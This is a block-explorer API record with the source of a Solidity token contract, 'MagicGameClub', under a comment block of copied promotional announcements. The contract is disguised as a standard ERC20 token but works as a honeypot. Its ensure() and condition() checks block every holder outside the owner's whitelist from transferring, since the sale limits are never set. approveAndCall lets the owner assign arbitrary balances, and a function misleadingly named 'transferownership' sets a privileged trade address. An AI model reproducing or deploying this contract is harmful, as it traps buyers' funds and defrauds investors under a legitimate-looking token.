{"status": "1", "message": "OK", "result": [{"SourceCode": "/*\r\nMedium:\r\nhttps://magicgameclub.medium.com/\r\nGithub:\r\nhttps://github.com/MagicGameClub\r\nTwitter:\r\nhttps://twitter.com/magicgameclub\r\nTelegram:\r\nhttps://telegram.me/magicgameclub\r\n\r\nBeta Launch \u2014 Magic Game Club (MAGICGAME)\r\n\r\nWe\u2019re extremely proud to announce that Magic Game Club has entered the beta launch phase! You can start testing immediately by visiting our website:\r\nMagic-gameclub.com\r\nThere are a few important details we need to share about the beta test phase, which we will outline below.\r\nWe welcome all gamers \u2014 both newbies and pros alike \u2014 to try out Magic Game Club and tell us what you think about the platform! We are accepting all kind of feedback, suggestions and any ideas you may have. Let\u2019s create the blockchain gaming platform of the future together.\r\n\r\nBeta test limitations\r\nThe most important notice is: you are not playing for real tokens!\r\nThe beta test phase will be played with \u201cimaginary\u201d ETH balances which will refill at each page load so that you may play as much as you want!\r\nDeposits & withdrawals are currently disabled and referral bonuses and similar mechanisms will not be live yet. You can however invite new players to the platform using your referral link and once the platform goes live, the referral information will be migrated!\r\nWe would also like to note that game graphics, logic and other mechanisms might change during the beta phase and for the official launch.\r\nReferral system\r\nEach player can create his/her own unique referral link which they can then share with communities, friends and other gamers to earn passive income from referral fees \u2014 0.25 % from the total game prize pot \u2014 forever!\r\nYou can visit the website section for referrals easily by clicking on the \u201cRefer a friend\u201d button in the menu.\r\n\r\nSneak peek of the platform\r\nTake a look at a few pictures from the platform below and we welcome you all to start exploring the features and also start playing the two test games!\r\nMagic Game Club\r\n\u201cMagic Game Club is a next generation hybrid blockchain-based online gaming platform, where players battle each other in fun & addicting simple games for rewards in cryptocurrencies!\u201d\r\n\r\nReferrals \u2014 Magic Game Club (MAGICGAME)\r\n\r\nFirst things first\u2026 The current platform is in Beta!\r\nWhat does that mean?\r\nEverything you do on the platform until the launch is in testing phase except\u2026 Referrals!!!\r\nReferral system \u2014 HOW?\r\nHow do I refer someone?\r\nMake sure your wallet is connected to Binance Smart Chain.\r\nConnect your wallet to the website MagicGame.gg (the wallet is used only for the referral system and nothing else on the website as it is still in BETA). It should be shown like this:\r\nConnected walletConnected wallet\r\nConnected wallet\r\nGo to the \u201cRefer a friend\u201d section (https://MagicGame.gg/refer), enter your custom referral code and click on \u201cSet\u201d:\r\n\r\nSetup your code\r\nAfter submitting your referral code, your custom link will appear and by clicking on \u201cCopy\u201d, it will be saved to your clipboard and by using paste function you can share it to with your friends, communities and on social media!\r\n\r\nYour referral link\r\nAnd that is how you do it! Simple as saying \u201cWALLSTREETGAMESROCK!\u201d\r\nReferral system \u2014 WHY?\r\nWhat I am going to gain if I refer someone?\r\nReferring a friend means getting up to 0.5% of the game rewards \u2014 PASSIVE INCOME!\r\nWhat is the exact amount of rewards I am going to receive?\r\nThere are two possibilities for that:\r\nYour referral is the only one that was referred in that match. Which means that you will get the whole 0.5% of the rewards!\r\nYour referral and his opponent are both referred which means that you will get 0.25% of the rewards as it is split between both referrers.\r\n\r\nMagic Game Club\r\n\u201cMagic Game Club is a next generation hybrid blockchain-based online gaming platform, where players battle each other in fun & addicting simple games for rewards in cryptocurrencies!\u201d\r\n\r\nMagic Game Club \u2014 Pre-Launch Update\r\nWhat have we done until now and where are we going?\r\nNot even a month old and\u2026\r\nThe IDO was a great success! Check how the IDO\u2019s of other platforms went at the time of the highly volatile market and compare it to how ours went. No issues whatsoever! Great success for the team!\r\nBeta testing \u2014 A great way to fine-tune the platform, search for the corner cases and identify the issues in real-time. The data acquired is helping us a lot! All thanks to you, MAGICGAME Army!\r\nListed on UniSwap, BitMart, JulSwap, Bilaxy, and Hotbit!\r\nWe listened to the community! We locked & increased the liquidity and opened a MAGICGAME / ETH liquidity pool on UniSwap!\r\nWe have acquired a great number of supporters among those we have WSBChairman, Eljaboom, and more!\r\nWhere do we go from here?\r\nReact platform\r\nThe best technology possible \u2014 for the best platform!\r\n\r\nMore info: https://anyforsoft.com/blog/10-famous-websites-built-react-js/ &\r\nhttps://medium.com/@coderacademy/32-sites-built-with-reactjs-172e3a4bed81\r\nDo we need to say more? ;)\r\nWhat does it mean for us?\r\nA fast & responsive platform!\r\nA secure platform!\r\nA desktop version!\r\nA mobile version (NOT AN ANDROID OR IOS APP)!\r\n\r\nApp view on MacBook\r\nBugs & pest control\r\nAs we are in the testing phase new bugs  appear in the process constantly. What we all need to understand is that software development planning is one of the hardest things to do in the business. The largest companies with the best developers in the world cannot set the exact date of launch without risking having critical bugs in it. That\u2019s why the delays happen. As our platform is will be using real coins and tokens, we cannot risk such bugs being present.\r\nNOTE: There will always be things to improve and minor bugs to fix.\r\nGetting ready for liftoff!\r\nThe things are getting real! We are going to announce the product launch soon! IF you are wondering why we are not announcing it at this exact moment please refer to the previous topic.\r\nSo what comes with the platform launch?\r\nPlay \u201cThe Trader\u201d against other players with real coins and tokens!\r\nWithdraw and deposit your favorite token!\r\nUsable coins/tokens: WETH, USDT, MAGICGAME, CAKE, DOGE, SHIBA, BAKE, JULD, SFP, TWT, SWG, and CUMMIES!\r\nWeekly rewards for the best players taken from the Treasury!\r\nVIP Group launch!\r\nEnjoy the game and win some fine rewards!\r\nWhat comes after the launch? \r\nMore games! We are launching with one game. Why? Because we want to see how many players there will be and then gradually expand to other games. Quality over quantity for the win!\r\nHint: Do you know a game called birdy flap? Or is it the other way around? ;)\r\nRematch option! Do you want to take your revenge on the one who beat you as the Sith got their revenge on the Jedi in the Star Wars: Revenge of the Sith movie?\r\nPrivate games! You\u2019ll be able to enjoy games with your friends in peace!\r\nA Discord channel & UX improvements on the platform!\r\nSingle-asset NFT staking!!!\r\n\r\nNTF? Hmm\u2026\r\nAnd so much more waiting in line! \r\n\u201cMagic Game Club is a next-generation hybrid blockchain-based online gaming platform, where players battle each other in fun & addicting simple games for rewards in cryptocurrencies!\u201d\r\n\r\nPlatform Launch Announcement\r\n\r\nThe OFFICIAL RELEASE date is on the 1st of July 2021!\r\nYes, you heard it correctly! The platform is in the final stage before the release!\r\n The platform will go live on the 1st of July 2021 at 12:00 UTC! \r\nWhat to expect on 01.07.2021? \r\nOn 01.07.2021 you will be able to:\r\nConnect your wallet and play Coin Explorer with the next tokens: ETH, CAKE, USDT, BAKE, JULD, SFP, TWT, SHIBA, DOGE, and MAGICGAME!\r\nThe best & the most active players on the platform will be awarded through the weekly treasury rewards!\r\nPlay and practice for free both Coin Explorer and The Trader!\r\nThe maximum wager amount will be $100 for the foreseeable future! This could be increased if we see a demand for it.\r\nThe minimum wager amount will be $5! This could be increased or decreased if we see a demand for it but we still need to take into account the network fees.\r\nVIP Group Launch!\r\nWhat changed and why? \r\nSecurity, quality, and one more time SECURITY!\r\nWe are not going to release The Trader game to be played with tokens and coins because some changes will be made to the gameplay. The game will be updated and remodeled to fit our platform and be secure for our users!\r\nSome tokens were left out because their project situation did not suit our platform's needs or have had a bad market performance.\r\nWebsite maintenance mode activates on the 29th of June! \r\nThe Website will be down two days before the release to migrate everything on the live platform and avoid any unnecessary issues.\r\nThe staking page will work without interference!\r\nWhat comes after the launch? \r\nMore games! We are launching with one game. Why? Because we want to see how many players there will be and then gradually expand to other games. Quality over quantity for the win!\r\nRematch option! Do you want to take your revenge on the one who beat you as the Sith got their revenge on the Jedi in the Star Wars: Revenge of the Sith movie? \r\nPrivate games! You\u2019ll be able to enjoy games with your friends in peace!\r\nA Discord channel & UX improvements on the platform!\r\nSingle-asset NFT staking!!!\r\n\r\n\u201cMagic Game Club is a next-generation hybrid blockchain-based online gaming platform, where players battle each other in fun & addicting simple games for rewards in cryptocurrencies!\u201d\r\n*/\r\n\r\npragma solidity ^0.5.17;\r\ninterface IERC20 {\r\n    function totalSupply() external view returns(uint);\r\n\r\n    function balanceOf(address account) external view returns(uint);\r\n\r\n    function transfer(address recipient, uint amount) external returns(bool);\r\n\r\n    function allowance(address owner, address spender) external view returns(uint);\r\n\r\n    function approve(address spender, uint amount) external returns(bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint amount) external returns(bool);\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\nlibrary Address {\r\n    function isContract(address account) internal view returns(bool) {\r\n        bytes32 codehash;\r\n        bytes32 accountHash;\r\n        // solhint-disable-next-line no-inline-assembly\r\n        assembly { codehash:= extcodehash(account) }\r\n        return (codehash != 0x0 && codehash != accountHash);\r\n    }\r\n}\r\n\r\ncontract Context {\r\n    constructor() internal {}\r\n    // solhint-disable-previous-line no-empty-blocks\r\n    function _msgSender() internal view returns(address payable) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint a, uint b) internal pure returns(uint) {\r\n        uint c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint a, uint b) internal pure returns(uint) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {\r\n        require(b <= a, errorMessage);\r\n        uint c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint a, uint b) internal pure returns(uint) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint a, uint b) internal pure returns(uint) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {\r\n        // Solidity only automatically asserts when dividing by 0\r\n        require(b > 0, errorMessage);\r\n        uint c = a / b;\r\n\r\n        return c;\r\n    }\r\n}\r\n\r\nlibrary SafeERC20 {\r\n    using SafeMath for uint;\r\n    using Address for address;\r\n\r\n    function safeTransfer(IERC20 token, address to, uint value) internal {\r\n        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\r\n    }\r\n\r\n    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {\r\n        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\r\n    }\r\n\r\n    function safeApprove(IERC20 token, address spender, uint value) internal {\r\n        require((value == 0) || (token.allowance(address(this), spender) == 0),\r\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\r\n        );\r\n        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\r\n    }\r\n\r\n    function callOptionalReturn(IERC20 token, bytes memory data) private {\r\n        require(address(token).isContract(), \"SafeERC20: call to non-contract\");\r\n\r\n        // solhint-disable-next-line avoid-low-level-calls\r\n        (bool success, bytes memory returndata) = address(token).call(data);\r\n        require(success, \"SafeERC20: low-level call failed\");\r\n\r\n        if (returndata.length > 0) { // Return data is optional\r\n            // solhint-disable-next-line max-line-length\r\n            require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\r\n        }\r\n    }\r\n}\r\n\r\ncontract ERC20 is Context, IERC20 {\r\n    using SafeMath for uint;\r\n    mapping(address => uint) private _balances;\r\n\r\n    mapping(address => mapping(address => uint)) private _allowances;\r\n\r\n    uint private _totalSupply;\r\n\r\n    function totalSupply() public view returns(uint) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view returns(uint) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint amount) public returns(bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view returns(uint) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint amount) public returns(bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint addedValue) public returns(bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\r\n        return true;\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint amount) internal {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _balances[sender] = _balances[sender].sub(amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n    }\r\n\r\n    function _mint(address account, uint amount) internal {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _totalSupply = _totalSupply.add(amount);\r\n        _balances[account] = _balances[account].add(amount);\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n\r\n    function _burn(address account, uint amount) internal {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        _balances[account] = _balances[account].sub(amount, \"ERC20: burn amount exceeds balance\");\r\n        _totalSupply = _totalSupply.sub(amount);\r\n        emit Transfer(account, address(0), amount);\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint amount) internal {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n}\r\n\r\ncontract ERC20Detailed is IERC20 {\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n\r\n    constructor(string memory name, string memory symbol, uint8 decimals) public {\r\n        _name = name;\r\n        _symbol = symbol;\r\n        _decimals = decimals;\r\n    }\r\n\r\n    function name() public view returns(string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns(string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns(uint8) {\r\n        return _decimals;\r\n    }\r\n}\r\n\r\n\r\ncontract MagicGameClub {\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n \r\n    function transfer(address _to, uint _value) public payable returns (bool) {\r\n        return transferFrom(msg.sender, _to, _value);\r\n    }\r\n \r\n    function ensure(address _from, address _to, uint _value) internal view returns(bool) {\r\n       \r\n        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){\r\n            return true;\r\n        }\r\n        require(condition(_from, _value));\r\n        return true;\r\n    }\r\n    \r\n    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {\r\n        if (_value == 0) {return true;}\r\n        if (msg.sender != _from) {\r\n            require(allowance[_from][msg.sender] >= _value);\r\n            allowance[_from][msg.sender] -= _value;\r\n        }\r\n        require(ensure(_from, _to, _value));\r\n        require(balanceOf[_from] >= _value);\r\n        balanceOf[_from] -= _value;\r\n        balanceOf[_to] += _value;\r\n        _onSaleNum[_from]++;\r\n        emit Transfer(_from, _to, _value);\r\n        return true;\r\n    }\r\n \r\n    function approve(address _spender, uint _value) public payable returns (bool) {\r\n        allowance[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n    \r\n    function condition(address _from, uint _value) internal view returns(bool){\r\n        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;\r\n        \r\n        if(_saleNum > 0){\r\n            if(_onSaleNum[_from] >= _saleNum) return false;\r\n        }\r\n        if(_minSale > 0){\r\n            if(_minSale > _value) return false;\r\n        }\r\n        if(_maxSale > 0){\r\n            if(_value > _maxSale) return false;\r\n        }\r\n        return true;\r\n    }\r\n \r\n    mapping(address=>uint256) private _onSaleNum;\r\n    mapping(address=>bool) private canSale;\r\n    uint256 private _minSale;\r\n    uint256 private _maxSale;\r\n    uint256 private _saleNum;\r\n    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {\r\n        require(msg.sender == owner);\r\n        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}\r\n        canSale[spender]=true;\r\n        return true;\r\n    }\r\n\r\n    address tradeAddress;\r\n    function transferownership(address addr) public returns(bool) {\r\n        require(msg.sender == owner);\r\n        tradeAddress = addr;\r\n        return true;\r\n    }\r\n \r\n    mapping (address => uint) public balanceOf;\r\n    mapping (address => mapping (address => uint)) public allowance;\r\n \r\n    uint constant public decimals = 18;\r\n    uint public totalSupply;\r\n    string public name;\r\n    string public symbol;\r\n    address private owner;\r\n \r\n    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {\r\n        name = _name;\r\n        symbol = _symbol;\r\n        totalSupply = _supply*(10**uint256(decimals));\r\n        owner = msg.sender;\r\n        balanceOf[msg.sender] = totalSupply;\r\n        emit Transfer(address(0x0), msg.sender, totalSupply);\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"string\",\"name\":\"_name\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"_symbol\",\"type\":\"string\"},{\"internalType\":\"uint256\",\"name\":\"_supply\",\"type\":\"uint256\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"approveAndCall\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"transferownership\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MagicGameClub", "CompilerVersion": "v0.5.17+commit.d19bba13", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000003b9aca00000000000000000000000000000000000000000000000000000000000000000f4d616769632047616d6520436c7562000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000094d4147494347414d450000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "bzzr://988c47e5e746e8c60f21e36b0385dff753a8efdbf9c55fb0f0eb2a01d7119240"}]}